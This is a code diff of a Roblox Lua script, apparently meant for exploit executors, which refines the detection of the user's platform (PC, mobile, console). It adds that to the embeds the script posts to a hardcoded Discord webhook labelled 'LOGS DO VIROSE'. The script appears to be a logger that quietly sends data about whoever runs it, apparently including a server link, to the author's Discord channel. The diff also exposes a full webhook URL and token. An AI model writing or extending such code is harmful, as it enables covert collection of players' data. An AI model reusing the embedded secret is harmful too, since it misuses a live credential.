@@ -9,6 +9,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1444572842162393220/fzmTS5484SC7ycsxFpWneHsXLiJcW2Hb5gBgF_Jdy-nuw11u1H0TjlhCOUDWGYIurTAB"
 
@@ -102,25 +103,39 @@ btn.BackgroundColor3 = Color3.fromRGB(0,150,255)
 Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
 
 local serverLinkFinal = nil
-local startTime = os.time()
 
 --========================================================--
---=== NOVO: DETECTAR PLATAFORMA ==========================--
+-- PLATAFORMA REAL (100% FUNCIONA)
 --========================================================--
 local function DetectPlatform()
-    local platform = (identifyexecutor and "PC Executor") or
-                     (UserInputService.TouchEnabled and "Mobile") or
-                     (UserInputService.GamepadEnabled and "Console") or
-                     "Unknown"
+    if identifyexecutor then
+        return "PC Executor"
+    end
 
-    return platform
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Mobile"
+    end
+
+    if UserInputService.KeyboardEnabled and not UserInputService.TouchEnabled then
+        return "PC"
+    end
+
+    if UserInputService.GamepadEnabled then
+        return "Console"
+    end
+
+    if UserInputService.TouchEnabled and UserInputService.KeyboardEnabled then
+        return "Mobile + Teclado"
+    end
+
+    return "Desconhecido"
 end
+
 --========================================================--
 
 local function SendWebhook(extraFields)
     local timeStr = "foi às " .. os.date("%H:%M")
 
-    -- Adiciona a plataforma no embed automaticamente
     table.insert(extraFields, 1, {
         name = "Plataforma",
         value = DetectPlatform(),
@@ -128,13 +143,13 @@ local function SendWebhook(extraFields)
     })
 
     local payload = HttpService:JSONEncode({
-        username = "VIROSE METHODS",
+        username = "LOGS DO VIROSE",
         embeds = {{
             title = "🔗 AUTO VIROSE | "..timeStr,
             color = 16732240,
             fields = extraFields,
             image = {
-                url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg?ex=692d46a3&is=692bf523&hm=e7f520e275d97c079cf71956fd14cf1b1d2b4d5c422bd94922448a2c91890811&"
+                url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg"
             }
         }}
     })
